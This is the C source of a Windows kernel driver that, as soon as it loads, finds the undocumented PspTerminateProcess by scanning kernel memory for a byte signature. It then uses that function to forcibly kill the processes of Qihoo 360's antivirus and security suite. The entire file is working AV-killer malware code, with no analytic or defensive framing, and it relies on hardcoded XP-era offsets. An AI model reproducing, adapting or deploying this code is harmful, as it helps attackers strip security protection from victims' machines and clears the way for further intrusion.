#include <ntddk.h>
typedef  NTSTATUS  (*PSPTERPROC) ( PEPROCESS Process, NTSTATUS ExitStatus );
PSPTERPROC MyPspTerminateProcess = NULL;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation, // 0 Y N
	SystemProcessorInformation, // 1 Y N
	SystemPerformanceInformation, // 2 Y N
	SystemTimeOfDayInformation, // 3 Y N
	SystemNotImplemented1, // 4 Y N
	SystemProcessesAndThreadsInformation, // 5 Y N
	SystemCallCounts, // 6 Y N
	SystemConfigurationInformation, // 7 Y N
	SystemProcessorTimes, // 8 Y N
	SystemGlobalFlag, // 9 Y Y
	SystemNotImplemented2, // 10 Y N
	SystemModuleInformation, // 11 Y N
	SystemLockInformation, // 12 Y N
	SystemNotImplemented3, // 13 Y N
	SystemNotImplemented4, // 14 Y N
	SystemNotImplemented5, // 15 Y N
	SystemHandleInformation, // 16 Y N
	SystemObjectInformation, // 17 Y N
	SystemPagefileInformation, // 18 Y N
	SystemInstructionEmulationCounts, // 19 Y N
	SystemInvalidInfoClass1, // 20
	SystemCacheInformation, // 21 Y Y
	SystemPoolTagInformation, // 22 Y N
	SystemProcessorStatistics, // 23 Y N
	SystemDpcInformation, // 24 Y Y
	SystemNotImplemented6, // 25 Y N
	SystemLoadImage, // 26 N Y
	SystemUnloadImage, // 27 N Y
	SystemTimeAdjustment, // 28 Y Y
	SystemNotImplemented7, // 29 Y N
	SystemNotImplemented8, // 30 Y N
	SystemNotImplemented9, // 31 Y N
	SystemCrashDumpInformation, // 32 Y N
	SystemExceptionInformation, // 33 Y N
	SystemCrashDumpStateInformation, // 34 Y Y/N
	SystemKernelDebuggerInformation, // 35 Y N
	SystemContextSwitchInformation, // 36 Y N
	SystemRegistryQuotaInformation, // 37 Y Y
	SystemLoadAndCallImage, // 38 N Y
	SystemPrioritySeparation, // 39 N Y
	SystemNotImplemented10, // 40 Y N
	SystemNotImplemented11, // 41 Y N
	SystemInvalidInfoClass2, // 42
	SystemInvalidInfoClass3, // 43
	SystemTimeZoneInformation, // 44 Y N
	SystemLookasideInformation, // 45 Y N
	SystemSetTimeSlipEvent, // 46 N Y
	SystemCreateSession, // 47 N Y
	SystemDeleteSession, // 48 N Y
	SystemInvalidInfoClass4, // 49
	SystemRangeStartInformation, // 50 Y N
	SystemVerifierInformation, // 51 Y Y
	SystemAddVerifier, // 52 N Y
	SystemSessionProcessesInformation // 53 Y N
} SYSTEM_INFORMATION_CLASS;
NTSYSAPI
	NTSTATUS
	NTAPI
	ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

typedef struct _SYSTEM_MODULE_INFORMATION { // Information Class 11
	ULONG Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

NTSTATUS
	PsLookupProcessByProcessId(
	IN HANDLE ProcessId,
	OUT PEPROCESS *Process
	);



PVOID GetUndocumentFunctionAdress()
{
	ULONG size,index;
	PULONG buf;
	ULONG i;
	PSYSTEM_MODULE_INFORMATION module;
	PVOID driverAddress=0;
	ULONG ntosknlBase;
	ULONG ntosknlEndAddr;
	ULONG curAddr;
	NTSTATUS status;
	ULONG retAddr;
	ULONG code1_sp2=0x8b55ff8b,code2_sp2=0xa16456ec,code3_sp2=0x00000124,code4_sp2=0x3b08758b;

	ZwQuerySystemInformation(SystemModuleInformation,&size, 0, &size);
	if(NULL==(buf = (PULONG)ExAllocatePool(PagedPool, size)))
	{
		DbgPrint("failed alloc memory failed \n");
		return 0;
	}

	status=ZwQuerySystemInformation(SystemModuleInformation,buf, size , 0);
	if(!NT_SUCCESS( status ))
	{
		DbgPrint("failed query\n");
		return 0;
	}

	module = (PSYSTEM_MODULE_INFORMATION)(( PULONG )buf + 1);
	ntosknlEndAddr=(ULONG)module->Base+(ULONG)module->Size;
	ntosknlBase=(ULONG)module->Base;
	curAddr=ntosknlBase;
	ExFreePool(buf);

	for (i=curAddr;i<=ntosknlEndAddr;i++)
	{
		if ((*((ULONG *)i)==code1_sp2)&&(*((ULONG *)(i+4))==code2_sp2)&&(*((ULONG *)(i+8))==code3_sp2)&&(*((ULONG*)(i+12)) == code4_sp2))
			return (PVOID)i;
	}
}
PEPROCESS SearchProcessByName(const char* ProcessName)
{
	ULONG i = 0;
	PEPROCESS hProcess;
	for(i=0;i<65535;i+=4)
	{
		if(PsLookupProcessByProcessId((HANDLE)i,&hProcess)==STATUS_SUCCESS)
			if (strcmp(ProcessName,(char*)((ULONG)hProcess+0x174)) == 0 && *(ULONG*)((ULONG)hProcess+0x1a0)!=0)
				return hProcess;
	}
	return NULL;
}
void DriverUnload(PDRIVER_OBJECT driver)
{
	
}

void Kill360()
{
	PEPROCESS hProcess1;
	PEPROCESS hProcess2;
	PEPROCESS hProcess3;
	PEPROCESS hProcess4;
	PEPROCESS hProcess5;
	PEPROCESS hProcess6;
	PEPROCESS hProcess7;
	PEPROCESS hProcess8;
	PEPROCESS hProcess9;
	//找到未公开函数地址
	MyPspTerminateProcess = (PSPTERPROC)GetUndocumentFunctionAdress();

	hProcess1 = SearchProcessByName("ZhuDongFangYu.e");
	if(hProcess1 != NULL)
		MyPspTerminateProcess(hProcess1,0);

	hProcess2 = SearchProcessByName("360Safe.exe");
	if(hProcess2 != NULL)
		MyPspTerminateProcess(hProcess2,0);

	hProcess3 = SearchProcessByName("360Tray.exe");
	if(hProcess3 != NULL)
		MyPspTerminateProcess(hProcess3,0);

	hProcess4 = SearchProcessByName("360tray.exe");
	if(hProcess4 != NULL)
		MyPspTerminateProcess(hProcess4,0);

	hProcess5 = SearchProcessByName("360speedld.exe");
	if(hProcess5 != NULL)
		MyPspTerminateProcess(hProcess5,0);

	hProcess6 = SearchProcessByName("LiveUpdate360.e");
	if(hProcess6 != NULL)
		MyPspTerminateProcess(hProcess6,0);

	hProcess7 = SearchProcessByName("360UHelper.exe");
	if(hProcess7 != NULL)
		MyPspTerminateProcess(hProcess7,0);

	hProcess8 = SearchProcessByName("SoftMgrLite.exe");
	if(hProcess8 != NULL)
		MyPspTerminateProcess(hProcess8,0);

	hProcess9 = SearchProcessByName("360AdvToolExecu");
	if(hProcess9 != NULL)
		MyPspTerminateProcess(hProcess9,0);


}
NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	driver->DriverUnload = DriverUnload;
	Kill360();
	return STATUS_SUCCESS;
}